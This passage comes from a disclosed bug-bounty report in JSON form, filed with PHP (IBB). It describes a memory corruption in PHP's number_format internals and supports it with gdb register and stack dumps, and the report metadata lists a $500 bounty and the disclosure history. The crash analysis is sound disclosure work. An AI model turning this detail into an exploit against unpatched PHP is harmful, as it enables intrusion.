class=\"p\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ememcpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ethousand_sep\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ethousand_sep_len\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBecause \u003cem\u003ethousand_sep_len\u003c/em\u003e is too big,  the result of \u003ccode\u003et -= thousand_sep_len;\u003c/code\u003e is unexpected value.\u003cbr\u003e\nIn this example, \u003ccode\u003e$ebp-0x10\u003c/code\u003e points to \u003cem\u003et\u003c/em\u003e.\u003c/p\u003e\n\n\u003cp\u003eBefore\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e [----------------------------------registers-----------------------------------]\nEAX: 0x9b000000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEBX: 0x52400010 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEFLAGS: 0x287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x834d3d9 \u0026lt;_php_math_number_format_ex+787\u0026gt;:  ja     0x834d3ff \u0026lt;_php_math_number_format_ex+825\u0026gt;\n   0x834d3db \u0026lt;_php_math_number_format_ex+789\u0026gt;:  mov    eax,DWORD PTR [ebp+0x20]\n   0x834d3de \u0026lt;_php_math_number_format_ex+792\u0026gt;:  neg    eax\n=\u0026gt; 0x834d3e0 \u0026lt;_php_math_number_format_ex+794\u0026gt;:  add    DWORD PTR [ebp-0x10],eax\n   0x834d3e3 \u0026lt;_php_math_number_format_ex+797\u0026gt;:  mov    eax,DWORD PTR [ebp-0x10]\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0834d3e0      1213                            t -= thousand_sep_len;\ngdb-peda$ x/1xw $ebp-0x10\n0xbfffbe78:     0x52200016\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e [----------------------------------registers-----------------------------------]\nEAX: 0x9b000000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEBX: 0x52400010 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n[-------------------------------------code-------------------------------------]\n   0x834d3db \u0026lt;_php_math_number_format_ex+789\u0026gt;:  mov    eax,DWORD PTR [ebp+0x20]\n   0x834d3de \u0026lt;_php_math_number_format_ex+792\u0026gt;:  neg    eax\n   0x834d3e0 \u0026lt;_php_math_number_format_ex+794\u0026gt;:  add    DWORD PTR [ebp-0x10],eax\n=\u0026gt; 0x834d3e3 \u0026lt;_php_math_number_format_ex+797\u0026gt;:  mov    eax,DWORD PTR [ebp-0x10]\n   0x834d3e6 \u0026lt;_php_math_number_format_ex+800\u0026gt;:  lea    edx,[eax+0x1]\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, _php_math_number_format_ex (d=1234567890, dec=0x0, dec_point=0xb78012b8 \u0026quot;.\u0026quot;,\n    dec_point_len=0x1, thousand_sep=0x52400010 \u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...,\n    thousand_sep_len=0x65000000) at /root/fuzzer/php7/ext/standard/math.c:1214\n1214                            memcpy(t + 1, thousand_sep, thousand_sep_len);\ngdb-peda$ x/1xw $ebp-0x10\n0xbfffbe78:     0xed200016\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e0xed200016 is an unusable memory address. \u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e_php_math_number_format_ex\u003c/code\u003e function tries to copy thousand separator into formatted string, leads to memory corruption ( reffer at \u003ccode\u003eext/standard/math.c:1214\u003c/code\u003e ):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003ememcpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ethousand_sep\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ethousand_sep_len\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e [----------------------------------registers-----------------------------------]\nEAX: 0x52400010 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEBX: 0x52400010 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nECX: 0x0\nEDX: 0xed200017\nESI: 0x65000000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\nEDI: 0xb7860188 --\u0026gt; 0x848b04e (\u0026lt;ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER\u0026gt;:      push   ebp)\nEBP: 0xbfffbe88 --\u0026gt; 0xbfffbf28 --\u0026gt; 0xbfffbf68 --\u0026gt; 0xbfffbf88 --\u0026gt; 0xbfffbfc8 --\u0026gt; 0xbfffbff8 (--\u0026gt; ...)\nESP: 0xbfffbe30 --\u0026gt; 0xed200017\nEIP: 0x834d3fa (\u0026lt;_php_math_number_format_ex+820\u0026gt;:       call   0x80647f0 \u0026lt;memcpy@plt\u0026gt;)\nEFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x834d3f0 \u0026lt;_php_math_number_format_ex+810\u0026gt;:  mov    eax,DWORD PTR [ebp+0x1c]\n   0x834d3f3 \u0026lt;_php_math_number_format_ex+813\u0026gt;:  mov    DWORD PTR [esp+0x4],eax\n   0x834d3f7 \u0026lt;_php_math_number_format_ex+817\u0026gt;:  mov    DWORD PTR [esp],edx\n=\u0026gt; 0x834d3fa \u0026lt;_php_math_number_format_ex+820\u0026gt;:  call   0x80647f0 \u0026lt;memcpy@plt\u0026gt;\n   0x834d3ff \u0026lt;_php_math_number_format_ex+825\u0026gt;:  mov    eax,DWORD PTR [ebp-0x2c]\n   0x834d402 \u0026lt;_php_math_number_format_ex+828\u0026gt;:  add    eax,0x10\n   0x834d405 \u0026lt;_php_math_number_format_ex+831\u0026gt;:  cmp    eax,DWORD PTR [ebp-0xc]\n   0x834d408 \u0026lt;_php_math_number_format_ex+834\u0026gt;:  jbe    0x834d38e \u0026lt;_php_math_number_format_ex+712\u0026gt;\nGuessed arguments:\narg[0]: 0xed200017\narg[1]: 0x52400010 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\narg[2]: 0x65000000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbe30 --\u0026gt; 0xed200017\n0004| 0xbfffbe34 --\u0026gt; 0x52400010 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0008| 0xbfffbe38 --\u0026gt; 0x65000000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n0012| 0xbfffbe3c --\u0026gt; 0xb4800000 (\u0026#39;A\u0026#39; \u0026lt;repeats 200 times\u0026gt;...)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x0834d3fa      1214                            memcpy(t + 1, thousand_sep, thousand_sep_len);\ngdb-peda$\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"expected-result\"\u003eExpected result:\u003c/h2\u003e\n\n\u003cp\u003eNo SIGSEGV\u003c/p\u003e\n\n\u003ch2 id=\"actual-result\"\u003eActual result:\u003c/h2\u003e\n\n\u003cp\u003eSIGSEGV\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:21:49.616Z","allow_singular_disclosure_after":-35666595.84156547,"singular_disclosure_allowed":true,"vote_count":1,"voters":["spetr0x"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1339052,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T20:47:38.684Z","updated_at":"2016-12-03T20:47:38.684Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":11365},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339053,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T20:47:46.350Z","updated_at":"2016-12-03T20:47:46.350Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"fosec","url":"/fosec"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339054,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T20:47:51.880Z","updated_at":"2016-12-03T20:47:51.880Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"fosec","url":"/fosec"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6025957,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:21:49.548Z","updated_at":"2019-10-13T09:21:49.548Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285698,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:21:52.990Z","updated_at":"2019-11-12T09:21:52.990Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}